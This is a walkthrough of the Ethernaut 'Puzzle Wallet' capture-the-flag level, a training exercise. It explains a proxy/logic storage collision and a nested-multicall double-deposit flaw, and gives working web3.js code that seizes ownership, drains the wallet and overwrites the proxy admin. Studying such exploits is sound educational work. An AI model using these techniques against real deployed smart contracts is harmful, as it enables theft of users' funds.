# [24. Puzzle Wallet](https://ethernaut.openzeppelin.com/level/0xe13a4a46C346154C41360AAe7f070943F67743c9)

We have an Upgradable Proxy implementation in use here. [Proxies](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies) are a sort of middleman between some logic and your main contract, such that instead of writing that logic in the main contract and thus not being able to upgrade it, you write it in some other contract and make the proxy point there. This way, if that logic needs an update you create a new contract and point the proxy there. `delegatecall` is used to implement this, but you should know by now that life is not easy when you use `delegatecall` without care!

## Storage Collision

The first thing we may notice is that there is a storage collision between proxy and logic.

| slot | proxy | logic |
|--|--|--|
| 0 | `pendingAdmin` | `owner` |
| 1 | `admin` | `maxBalance` |
| 2 |  | `whitelisted`  (map) |
| 3 |  | `balances`  (map) |

With this exploit in mind, let us see our options:

- If the logic writes to `maxBalance`, it will overwrite `admin` in the proxy. That seems to be a good attack vector to win the game.

- To update `maxBalance`, the wallet balance must be 0 and `msg.sender` must be whitelisted.

- For wallet balance to be 0, we need to drain it somehow.

- To be whitelisted, `addToWhitelist` must be called by the `owner`.

- But hey, `owner` collided with `pendingAdmin` in the proxy, and we can very well overwrite it via `proposeAdmin`! We can add ourselves to the whitelist after becoming the owner.

## Draining the Wallet

The plan seems good so far, but one piece is missing: how do we drain the wallet? Assuming we are both the owner and whitelisted, let's see what we have:

- `deposit` function allows you to deposit, with respect to not exceeding `maxBalance`.
- `execute` function allows you to `call` a function on any address with some value that is within your balance. Without any call data and your address as the destination, this acts like a `withdraw` function.
- `multicall` function allows you to make multiple calls of the above two, in a single transaction. This function is basically the main idea of the entire contract.

The `multicall` function supposedly checks for double spending on `deposit` via a boolean flag; however, this flag works only for one `multicall`! If you were to call `multicall` within a `multicall`, you can bypass it. Since `delegatecall` forwards `msg.value` too, you can put more money than you have to your balance.

## Attack

First things first, let's become the `owner` and whitelist ourselves. Within the console, we are only exposed to the logic contract (`PuzzleWallet`) via `contract` object, but everything goes through proxy first. We can call the functions there by manually giving the calldata.

```js
const functionSelector = '0xa6376746'; // proposeNewAdmin(address)
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: web3.utils.encodePacked(functionSelector, web3.utils.padLeft(player, 64))
})
// confirm that it worked
if (player == (await contract.owner())) {
  // whitelist ourselves
  await contract.addToWhitelist(player)
}
```

The next step is to drain the contract balance. When we check the total balance via `await getBalance(contract.address)` we get `0.001`. So if we somehow deposit `0.001` twice with double-spending, the contract will think total balance to be `0.003` but actually it will be `0.002`. Then we can withdraw our balance alone and the contract balance will be drained.

Here is a schema on how we will arrange the `multicall`s:

```js
// let 'b' denote balance of contract
// call with {value: b}
multicall:[
  deposit(), 
  multicall:[
    deposit() // double spending!
  ],
  execute(player, 2 * b, []) // drain contract
]
```

Writing the actual code for this schema:

```js
// contract balance
const _b = web3.utils.toWei(await getBalance(contract.address))
// 2 times contract balance
const _2b = web3.utils.toBN(_b).add(web3.utils.toBN(_b))
await contract.multicall([
  // first deposit
  (await contract.methods["deposit()"].request()).data,
  // multicall for the second deposit
  (await contract.methods["multicall(bytes[])"].request([
    // second deposit
    (await contract.methods["deposit()"].request()).data
  ])).data,
  // withdraw via execute
  (await contract.methods["execute(address,uint256,bytes)"].request(player, _2b, [])).data
],
{value: _b})
```

Thanks to the `multicall`, the attack will be executed in a single transaction too :) Afterwards, we can confirm via `await getBalance(contract.address)` that the balance of the contract is now 0.

We are ready for the next step, which is to call `setMaxBalance`. Whatever value we send here will overwrite the `admin` value, so we just convert our address to an `uint256` and call this function:

```js
await contract.setMaxBalance(web3.utils.hexToNumberString(player))
// see that admin value is overwritten
await web3.eth.getStorageAt(contract.address, 1)
```

That is all!
